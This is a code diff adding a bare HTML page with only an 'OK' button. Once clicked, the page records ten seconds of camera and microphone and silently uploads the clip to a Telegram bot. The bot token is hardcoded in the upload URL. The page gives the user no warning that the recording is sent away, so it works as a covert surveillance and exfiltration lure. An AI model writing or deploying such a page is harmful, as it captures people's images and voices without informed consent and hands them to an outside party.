@@ -1,1 +1,51 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Recording</title>
+  <style>
+    body {
+      background-color: black;
+    }
+  </style>
+</head>
+<body>
+  <button id="ok-button">OK</button>
+  <script>
+    const okButton = document.getElementById('ok-button');
+    okButton.addEventListener('click', async () => {
+      try {
+        // Request camera permission
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const videoTracks = stream.getVideoTracks();
+        const videoTrack = videoTracks[0];
+        
+        // Start camera recording
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
+        mediaRecorder.ondataavailable = event => {
+          chunks.push(event.data);
+        };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          chunks = [];
+          
+          // Send recorded video to Telegram bot
+          const formData = new FormData();
+          formData.append('video', blob);
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', `https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendVideo`, true);
+          xhr.send(formData);
+        };
+        mediaRecorder.start();
+        
+        // Stop recording after 10 seconds
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 10000);
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    });
+  </script>
+</body>
+</html>
